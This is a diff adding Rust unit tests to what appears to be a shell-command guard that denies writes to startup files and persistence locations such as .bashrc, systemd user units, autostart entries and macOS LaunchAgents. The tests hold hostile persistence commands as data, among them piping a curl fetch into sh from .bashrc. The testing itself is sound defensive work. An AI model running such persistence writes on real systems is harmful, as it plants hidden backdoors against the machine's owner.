@@ -460,3 +460,105 @@ fn benign_printf_to_local_bin_allows() {
         0,
     );
 }
+
+// ---------------------------------------------------------------------
+// 1.2.0 adversarial-review: ANY write to a shell startup file or
+// persistence-class directory denies, regardless of payload content.
+// The existing m2_staged_payload_to_exec_target only fired when the
+// payload contained exfil tokens (secret + net tool), so e.g.
+// `echo "curl x | sh" >> ~/.bashrc` slipped through.
+// ---------------------------------------------------------------------
+
+#[test]
+fn echo_to_bashrc_denies_even_without_exfil_tokens() {
+    assert_eq!(
+        run_pre_bash(&bash_input(r#"echo 'curl x | sh' >> ~/.bashrc"#)),
+        2,
+    );
+}
+
+#[test]
+fn printf_to_zshrc_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input(r#"printf '%s' 'alias ls=ls' > ~/.zshrc"#)),
+        2,
+    );
+}
+
+#[test]
+fn heredoc_to_bashrc_via_cat_denies() {
+    // `cat > ~/.bashrc <<EOF ... EOF` — canonical heredoc variant.
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            "cat > ~/.bashrc <<EOF\nfoo\nEOF"
+        )),
+        2,
+    );
+}
+
+#[test]
+fn write_to_zshenv_denies() {
+    // zshenv is sourced by EVERY zsh (incl. non-interactive, cron).
+    assert_eq!(
+        run_pre_bash(&bash_input("echo 'hi' > ~/.zshenv")),
+        2,
+    );
+}
+
+#[test]
+fn write_to_fish_config_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            "echo 'set -x PATH /tmp $PATH' > ~/.config/fish/config.fish"
+        )),
+        2,
+    );
+}
+
+#[test]
+fn write_to_systemd_user_unit_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            r#"echo '[Service]' > ~/.config/systemd/user/attack.service"#
+        )),
+        2,
+    );
+}
+
+#[test]
+fn write_to_xdg_autostart_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            "echo '[Desktop Entry]' > ~/.config/autostart/attack.desktop"
+        )),
+        2,
+    );
+}
+
+#[test]
+fn write_to_macos_launchagent_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            "echo '<plist>' > ~/Library/LaunchAgents/com.attacker.plist"
+        )),
+        2,
+    );
+}
+
+#[test]
+fn write_to_etc_profile_d_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input("echo 'hi' > /etc/profile.d/attack.sh")),
+        2,
+    );
+}
+
+#[test]
+fn regular_txt_write_still_allows() {
+    // Writing a normal `.txt` file outside persistence dirs should
+    // still be allowed — we don't want to over-deny benign tooling.
+    assert_eq!(
+        run_pre_bash(&bash_input("echo 'hello' > /tmp/x.txt")),
+        0,
+    );
+}
